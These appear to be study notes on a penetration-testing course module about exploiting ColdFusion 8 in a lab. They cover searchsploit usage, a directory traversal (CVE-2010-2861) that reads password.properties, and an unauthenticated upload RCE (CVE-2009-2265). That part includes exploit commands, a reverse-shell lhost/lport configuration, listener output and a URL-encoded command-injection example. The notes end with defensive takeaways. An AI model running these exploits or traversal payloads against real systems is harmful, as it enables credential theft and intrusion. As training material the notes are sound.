## 🎯 Module Objective

In the previous module we identified:

```text
ColdFusion 8
```

as the target.

Now the goal is to move from:

```text
Discovery
   ↓
Version Identification
   ↓
Known Exploit Research
   ↓
Vulnerability Validation
   ↓
Exploitation
   ↓
Remote Shell
```

The module primarily demonstrates two attack paths:

1. **CVE-2010-2861 — Directory Traversal**
    
2. **CVE-2009-2265 — Unauthenticated RCE**
    

The first can disclose sensitive configuration information, while the second can ultimately provide a remote shell.

---

# 1. 🔎 Searchsploit

Once the exact technology/version is known, the next logical step is to search for known exploits.

The module uses **Searchsploit**, a command-line tool for searching the Exploit Database.

Run:

```bash
searchsploit adobe coldfusion
```

The module's output includes:

```text
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting
Adobe ColdFusion - Directory Traversal
Adobe ColdFusion - Directory Traversal (Metasploit)
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi
Adobe ColdFusion 2018 - Arbitrary File Upload
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities
Adobe ColdFusion 8 - Remote Command Execution (RCE)
Adobe ColdFusion 9 - Administrative Authentication Bypass
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection
```

### 🎯 What matters?

We already know:

```text
ColdFusion 8
```

Therefore, the two particularly interesting results are:

```text
Adobe ColdFusion - Directory Traversal
Adobe ColdFusion 8 - Remote Command Execution (RCE)
```

---

# 🧠 CPTS Methodology

This is an important workflow to memorize:

```text
Identify Technology
       ↓
Identify Version
       ↓
searchsploit <technology>
       ↓
Filter by Version
       ↓
Read/understand exploit
       ↓
Validate applicability
       ↓
Exploit
```

### ❌ Bad methodology

```text
See ColdFusion
      ↓
Fire random exploit
```

### ✅ Good methodology

```text
ColdFusion 8
      ↓
Search exploits
      ↓
ColdFusion 8-specific results
      ↓
Check vulnerability conditions
      ↓
Test
```

---

# 2. 📂 Directory / Path Traversal

**Directory/Path Traversal** allows an attacker to access files and directories outside the intended directory.

It generally occurs because user-controlled input isn't properly validated. The input may come from:

- URL parameters
    
- Form fields
    
- Cookies
    
- Other application inputs
    

### Basic concept

Suppose an application intends to provide:

```text
/uploads/file.txt
```

but accepts:

```text
../../../etc/passwd
```

The attacker is attempting to escape:

```text
/uploads/
```

and reach:

```text
/etc/passwd
```

---

# 3. Path Traversal Visualization

```text
Application intended directory

/var/www/uploads/
       │
       ├── image.jpg
       ├── report.pdf
       └── notes.txt


Attacker:

../../../etc/passwd
       │
       ▼
/var/www/uploads/
       │
       ../
       ▼
/var/www/
       │
       ../
       ▼
/var/
       │
       ../
       ▼
/
       │
       ▼
/etc/passwd
```

---

# 4. ColdFusion File Operations

ColdFusion has tags used for file and directory operations, including:

```text
CFFile
CFDIRECTORY
```

These can be used for:

- Uploading
    
- Downloading
    
- Listing files
    

If application input is passed into these operations without proper validation, path traversal can become possible.

---

# 5. Example Vulnerable ColdFusion Code

The module provides:

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

The application intends to list:

```text
uploads/
```

But if the directory parameter is improperly controlled, an attacker could manipulate the path.

Example:

```text
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

---

# 6. CVE-2010-2861

The Searchsploit result:

```text
Adobe ColdFusion - Directory Traversal
```

corresponds to:

# **CVE-2010-2861**

The module describes this as a ColdFusion directory traversal vulnerability affecting:

```text
Adobe ColdFusion 9.0.1
and earlier versions
```

It allows remote attackers to read arbitrary files by manipulating the **`locale` parameter** in vulnerable ColdFusion endpoints.

### Vulnerable paths listed in the module

```text
CFIDE/administrator/settings/mappings.cfm
logging/settings.cfm
datasources/index.cfm
j2eepackaging/editarchive.cfm
CFIDE/administrator/enter.cfm
```

---

# 7. Exploiting the `locale` Parameter

Normal request:

```text
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

The attacker manipulates:

```text
locale=en
```

into a traversal path:

```text
locale=../../../../../etc/passwd
```

Full example:

```text
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

### Key observation

The parameter doesn't necessarily look dangerous.

```text
locale=en
```

looks completely normal.

The vulnerability exists because the application uses the value in an unsafe filesystem operation.

---

# 8. Finding the Exploit With Searchsploit

We can locate exploit **EDB-ID 14641**:

```bash
searchsploit -p 14641
```

Output:

```text
Exploit: Adobe ColdFusion - Directory Traversal
URL: https://www.exploit-db.com/exploits/14641
Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable
```

Copy it:

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```

Then:

```bash
python2 14641.py
```

The script displays:

```text
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

---

# 9. 🎯 Why `password.properties` Is Interesting

ColdFusion contains a configuration file:

```text
password.properties
```

The module explains that this file stores encrypted passwords for various ColdFusion services/resources.

These can include:

```text
Database connections
Mail servers
LDAP servers
Other authenticated resources
```

The file is usually located under:

```text
[cf_root]/lib
```

### Attacker's thought process

```text
Path Traversal
      ↓
Arbitrary file read
      ↓
Find ColdFusion configuration
      ↓
Find password.properties
      ↓
Potential credential material
```

This is a classic example of why **file disclosure can be more valuable than simply reading `/etc/passwd`**.

---

# 10. Exploiting CVE-2010-2861

The module executes:

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

The exploit returns:

```text
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```

The module concludes that retrieving this file proves the target is vulnerable to:

```text
CVE-2010-2861
```

---

# 🧠 CPTS Point — Arbitrary File Read

When you discover an arbitrary file read, don't immediately stop at:

```text
/etc/passwd
```

Think:

```text
Application files
       ↓
Configuration
       ↓
Credentials
       ↓
Database configuration
       ↓
API keys
       ↓
Service credentials
       ↓
SSH keys
       ↓
Internal application secrets
```

The **context of the target** determines what files are valuable.

---

# 💥 11. Unauthenticated Remote Code Execution

The second major attack path is:

# **Unauthenticated RCE**

Unauthenticated RCE means an attacker can execute arbitrary code on the target **without valid authentication credentials**.

This is particularly dangerous because there is no authentication barrier between:

```text
Internet/Network
      ↓
Vulnerable application
      ↓
OS command execution
```

---

# 12. RCE vs Unauthenticated RCE

### Normal RCE

```text
Attacker
   ↓
Authentication
   ↓
Application
   ↓
RCE
```

### Unauthenticated RCE

```text
Attacker
   ↓
Application
   ↓
RCE
```

The second scenario removes an entire security boundary.

---

# 13. Example Vulnerable ColdFusion Code

The module demonstrates:

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

Here:

```text
cgi.query_string
       ↓
cmd variable
       ↓
cmd.exe /c
       ↓
OS command execution
```

There is no authentication requirement and insufficient input validation.

---

# 14. Command Injection Concept

The module gives this example:

```text
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Notice:

```text
%3B
```

represents:

```text
;
```

The semicolon can be used to separate commands in the vulnerable scenario.

---

# 15. CVE-2009-2265

The module identifies:

# **CVE-2009-2265**

as an example of an unauthenticated ColdFusion RCE.

It affected:

```text
Adobe ColdFusion 8.0.1 and earlier
```

The vulnerability existed in the **FCKeditor package** and allowed unauthenticated users to upload files and gain remote code execution.

The vulnerable path shown is:

```text
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

---

# 🔥 Attack Chain — CVE-2009-2265

```text
ColdFusion 8
      │
      ▼
FCKeditor upload functionality
      │
      ▼
Unauthenticated file upload
      │
      ▼
Server-side executable file
      │
      ▼
Remote Code Execution
      │
      ▼
Reverse shell
```

---

# 16. Finding the RCE Exploit

Searchsploit identified the exploit as:

```text
Adobe ColdFusion 8 - Remote Command Execution (RCE)
```

Search using:

```bash
searchsploit -p 50057
```

Output:

```text
Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
URL: https://www.exploit-db.com/exploits/50057
Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable
```

Copy:

```bash
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

---

# 17. Understanding the Exploit Configuration

The module modifies the exploit with:

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

### Know what these mean

|Variable|Meaning|
|---|---|
|`lhost`|Listener/attacker IP|
|`lport`|Listener/attacker port|
|`rhost`|Remote target IP|
|`rport`|Remote target port|
|`filename`|Random generated payload filename|

---

# 18. Exploitation

The exploit is launched:

```bash
python3 50057.py
```

The module shows:

```text
Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp
```

The exploit constructs a multipart upload request:

```text
Content-type: multipart/form-data
Content-length: 1698
```

and uploads the generated payload.

The server response reveals the uploaded location:

```text
/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/
1269fd7bd2b341fab6751ec31bbfb610.txt
```

---

# 19. Exploit Parameters

The module prints:

```text
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp
```

Then:

```text
Deleting the payload...

Listening for connection...

Executing the payload...
```

The listener receives a connection:

```text
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

---

# 🐚 20. Remote Shell

The attacker now has a Windows command shell:

```text
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

Current directory:

```text
C:\ColdFusion8\runtime\bin
```

Running:

```cmd
dir
```

reveals ColdFusion runtime executables such as:

```text
java2wsdl.exe
jikes.exe
jrun.exe
jrunsvc.exe
jspc.exe
jvm.config
migrate.exe
portscan.dll
sniffer.exe
WindowsLogin.dll
wsconfig.exe
wsconfig_jvm.config
wsdl2java.exe
xmlscript.exe
```

---

# 🧠 Full ColdFusion Attack Flow

```text
                    TARGET
                       │
                       ▼
              ColdFusion 8 identified
                       │
                       ▼
                searchsploit
                       │
             ┌─────────┴─────────┐
             ▼                   ▼
      CVE-2010-2861        CVE-2009-2265
      Directory Traversal  Unauthenticated RCE
             │                   │
             ▼                   ▼
       Arbitrary File       File Upload
             Read                │
             │                   ▼
             ▼                 RCE
    password.properties          │
             │                   ▼
             ▼              Reverse Shell
      Credential Data            │
                                 ▼
                         Windows Command Shell
```

---

# 🔥 Important Comparison

||CVE-2010-2861|CVE-2009-2265|
|---|---|---|
|Vulnerability|Directory Traversal|Unauthenticated RCE|
|Main impact|Arbitrary file read|Remote code execution|
|Authentication|Remote file disclosure|No authentication|
|Key component|ColdFusion endpoints|FCKeditor|
|Versions|`9.0.1 and earlier`|`8.0.1 and earlier`|
|Module exploit|`14641.py`|`50057.py`|
|Result|`password.properties`|Remote shell|

---

# 🎯 CPTS Exam Points

## ⭐ 1. Searchsploit comes **after** fingerprinting

Don't blindly search:

```text
ColdFusion
```

if you haven't established that ColdFusion is actually present.

Better:

```text
Port
 ↓
CFIDE
 ↓
.cfm
 ↓
ColdFusion
 ↓
Version
 ↓
Searchsploit
```

---

## ⭐ 2. Version matching is critical

We identified:

```text
ColdFusion 8
```

Therefore:

```text
CVE-2009-2265
```

becomes particularly interesting because the module states that it affects:

```text
ColdFusion 8.0.1 and earlier
```

---

## ⭐ 3. Path traversal isn't just `/etc/passwd`

Think:

```text
Path Traversal
      ↓
Arbitrary File Read
      ↓
Application Configuration
      ↓
Credentials / Secrets
      ↓
Further Access
```

---

## ⭐ 4. Understand the difference between RCE and unauthenticated RCE

```text
RCE
→ arbitrary code execution

Unauthenticated RCE
→ arbitrary code execution
→ without valid credentials
```

The latter is especially dangerous.

---

## ⭐ 5. Understand exploit prerequisites

For every exploit ask:

```text
What version?
What endpoint?
What component?
Authenticated?
Unauthenticated?
What input is controlled?
What does successful exploitation provide?
```

---

# 🛡️ Defensive Takeaways

The module's vulnerabilities demonstrate why ColdFusion deployments should:

- Keep ColdFusion patched.
    
- Avoid exposing administrative interfaces unnecessarily.
    
- Validate file/path parameters.
    
- Restrict file upload functionality.
    
- Disable unnecessary legacy components.
    
- Avoid exposing sensitive configuration files.
    
- Properly authenticate administrative functionality.
    
- Use least privilege for the ColdFusion service account.
    
- Monitor suspicious file uploads and unexpected JSP files.
    
- Restrict network access to management interfaces.
    

---

# 📋 ColdFusion Attack Checklist

```text
[ ] Identify ColdFusion
[ ] Identify exact version
[ ] Enumerate CFIDE
[ ] Check /CFIDE/administrator/
[ ] Look for .cfm
[ ] Look for .cfc
[ ] Inspect HTTP headers
[ ] Check error messages
[ ] Run searchsploit
[ ] Match exploits to version
[ ] Investigate directory traversal
[ ] Identify arbitrary file read
[ ] Look for configuration files
[ ] Check password.properties
[ ] Investigate authentication requirements
[ ] Check legacy file-upload components
[ ] Validate applicable RCE vulnerabilities
[ ] Document initial access
[ ] Determine shell privilege
[ ] Continue post-exploitation enumeration
```

---

# ⚡ FINAL CHEAT SHEET

### Identification

```text
ColdFusion
CFML
.cfm
.cfc
CFIDE
/CFIDE/administrator/
8500
```

### Searchsploit

```bash
searchsploit adobe coldfusion
```

### CVE-2010-2861

```text
Adobe ColdFusion - Directory Traversal
```

Exploit:

```bash
searchsploit -p 14641
```

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```

Usage:

```text
14641.py <host> <port> <file_path>
```

Example from the module:

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

---

### CVE-2009-2265

```text
Adobe ColdFusion 8 - Remote Command Execution (RCE)
```

Exploit:

```bash
searchsploit -p 50057
```

```bash
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Important target:

```text
ColdFusion 8.0.1 and earlier
```

Vulnerable FCKeditor path:

```text
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
```

---

# 🧠 Golden Mental Model

```text
       DISCOVER
          │
          ▼
   ColdFusion 8
          │
          ▼
     SEARCHSPLOIT
          │
          ▼
 ┌────────┴─────────┐
 │                  │
 ▼                  ▼
Traversal           RCE
 │                  │
 ▼                  ▼
Read files       Upload payload
 │                  │
 ▼                  ▼
password.          Execute
properties           │
 │                  ▼
 ▼              Reverse shell
Secrets
```

### 🔥 The biggest CPTS lesson

**The exploit isn't the hard part. The reasoning chain is.**

You first established **ColdFusion → version 8 → applicable exploits → vulnerable endpoint → impact**. That's the workflow you want to reproduce during an exam rather than simply memorizing `14641.py` or `50057.py`.